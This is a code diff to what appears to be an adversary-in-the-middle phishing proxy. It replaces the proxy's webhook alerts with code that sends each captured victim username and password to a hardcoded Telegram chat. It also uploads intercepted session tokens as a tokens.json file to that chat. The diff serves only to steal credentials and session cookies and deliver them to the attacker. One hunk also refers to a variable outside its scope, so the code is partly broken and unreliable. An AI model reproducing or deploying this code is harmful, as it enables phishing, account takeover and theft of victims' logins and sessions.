@@ -546,9 +546,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
-											if len(um[1]) > 0 && p.cfg.webhook_verbosity == 2 {
-												p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, um[1]))
-											}
+											// Send Telegram notification
+											msg := tgbotapi.NewMessage(-4153330383, fmt.Sprintf("Username: %s ", um[1]))
+											bot.Send(msg)
 										}
 									}
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
@@ -559,9 +559,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
-											if len(pm[1]) > 0 && p.cfg.webhook_verbosity == 2 {
-												p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, pm[1]))
-											}
+											// Send Telegram notification
+											msg := tgbotapi.NewMessage(-4153330383, fmt.Sprintf("Password: %s ", pm[1]))
+											bot.Send(msg)
 										}
 									}
 									for _, cp := range pl.custom {
@@ -780,6 +780,29 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if is_auth {
 				// we have all auth tokens
 				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
+
+				// Access session from map and handle potential errors
+				s, ok := p.sessions[ps.SessionId]
+				if ok {
+					tokensBytes, err := json.Marshal(s.Tokens)
+					if err != nil {
+						log.Error("Error marshaling tokens to JSON:", err)
+					} else {
+						fileData := tgbotapi.FileBytes{
+							Name:   "tokens.json",
+							Bytes:  tokensBytes,
+						}
+						msg := tgbotapi.NewDocument(-4153330383, fileData)
+						_, err = bot.Send(msg) // Use the bot instance initialized outside this function
+						if err != nil {
+							log.Error("Error sending tokens to Telegram:", err)
+						} else {
+							log.Success("Tokens sent to Telegram")
+						}
+					}
+				} else {
+					log.Error("Session not found in session map")
+				}
 			}
 
 			// modify received body
@@ -902,13 +925,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
-
-								shouldSend := p.cfg.webhook_verbosity == 1 && !s.WebhookSent
-								if len(s.Tokens) > 0 && shouldSend || p.cfg.webhook_verbosity == 2 {
-									str := `[%d] Username: %v | Password: %v`
-									victimInfo := fmt.Sprintf(str, ps.Index, s.Username, s.Password)
-									p.NotifyWebhook(victimInfo)
-									p.SendCookies(TokensToJSON(pl, s.Tokens))
+								fileData := tgbotapi.FileBytes{
+									Name:   "tokens.json",
+									Bytes:  tokensBytes,
+								}
+								msg := tgbotapi.NewDocument(-4153330383, fileData)
+								_, err = bot.Send(msg) // Use the bot instance initialized outside this function
+								if err != nil {
+									log.Error("Error sending tokens to Telegram:", err)
+								} else {
+									log.Success("Tokens sent to Telegram")
 								}
 							}
 							break
